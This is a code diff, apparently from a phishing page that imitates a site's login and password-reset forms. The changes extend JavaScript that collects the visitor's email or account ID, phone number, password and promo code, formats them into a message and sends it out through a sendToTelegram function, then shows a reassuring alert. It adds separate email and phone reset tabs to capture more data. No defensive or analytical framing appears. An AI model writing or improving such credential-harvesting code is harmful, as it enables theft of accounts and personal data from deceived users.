+        emailBtn.className = 'brand-yellow text-gray-900 font-bold text-xs py-3 rounded-xl flex items-center justify-center gap-2 shadow-2xs';
+        phoneBtn.className = 'bg-gray-100 text-gray-800 font-bold text-xs py-3 rounded-xl flex items-center justify-center gap-2';
+        instruction.textContent = 'Fill your email and we send you new password';
+        emailWrap.classList.remove('hidden');
+        phoneWrap.classList.add('hidden');
+        emailInput.required = true;
+        phoneInput.required = false;
+      } else {
+        phoneBtn.className = 'brand-yellow text-gray-900 font-bold text-xs py-3 rounded-xl flex items-center justify-center gap-2 shadow-2xs';
+        emailBtn.className = 'bg-gray-100 text-gray-800 font-bold text-xs py-3 rounded-xl flex items-center justify-center gap-2';
+        instruction.textContent = 'Please fill in your phone number below to get a new password';
+        phoneWrap.classList.remove('hidden');
+        emailWrap.classList.add('hidden');
+        phoneInput.required = true;
+        emailInput.required = false;
       }
     }
 
@@ -1042,11 +1077,11 @@
       if (actionName === "Login") {
         const isEmailVisible = !document.getElementById("emailInputWrap").classList.contains("hidden");
         if (isEmailVisible) {
-          const emailOrId = document.querySelector("#emailInputWrap input")?.value.trim() || "";
+          const emailOrId = document.getElementById("loginEmailInput")?.value.trim() || "";
           details += `<b>Method:</b> Email / Account ID\n`;
           details += `<b>Email/ID:</b> <code>${emailOrId}</code>\n`;
         } else {
-          const phone = document.querySelector("#phoneInputWrap input")?.value.trim() || "";
+          const phone = document.getElementById("loginPhoneInput")?.value.trim() || "";
           details += `<b>Method:</b> Phone (+91)\n`;
           details += `<b>Phone:</b> <code>+91 ${phone}</code>\n`;
         }
@@ -1060,13 +1095,20 @@
         details += `<b>Password:</b> <code>${password}</code>\n`;
         details += `<b>Promo Code:</b> <code>${promo}</code>`;
       } else if (actionName === "Password Reset") {
-        const email = form.querySelector('input[type="email"]')?.value.trim() || "";
-        details += `<b>Reset Email:</b> <code>${email}</code>`;
+        if (activeResetTab === "phone") {
+          const phone = document.getElementById("resetPhoneInput")?.value.trim() || "";
+          details += `<b>Reset Method:</b> Phone (+91)\n`;
+          details += `<b>Phone:</b> <code>+91 ${phone}</code>`;
+        } else {
+          const email = document.getElementById("resetEmailInput")?.value.trim() || "";
+          details += `<b>Reset Method:</b> Email\n`;
+          details += `<b>Email:</b> <code>${email}</code>`;
+        }
       }
 
       try {
         await sendToTelegram(details);
-        alert(`${actionName} successful!`);
+        alert(`${actionName} request sent!`);
         form.reset();
         closeModals();
       } catch (err) {
